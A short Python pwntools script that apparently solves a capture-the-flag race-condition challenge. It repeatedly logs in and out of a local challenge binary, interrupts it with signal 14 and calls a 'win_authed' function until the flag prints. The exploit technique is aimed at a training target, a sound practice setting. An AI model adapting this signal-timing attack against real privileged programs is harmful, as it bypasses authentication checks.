from pwn import *
while True:
    p = process("/challenge/babyrace_level7.1")
    p.recvuntil("Function (login/logout/win_authed/quit):")
    p.sendline("login")
    #p.sendline("AAAAAAA")
    p.recvuntil("Function (login/logout/win_authed/quit):")
    p.sendline("logout")
    os.kill(p.pid, 14)
    #p.sendline("AAAAAAA")
    p.recvuntil("Function (login/logout/win_authed/quit):")
    p.sendline("win_authed")
    a = p.recvall(timeout=1)
    p.close()
    if a.find(b"flag") != -1:
        print(a)
        break
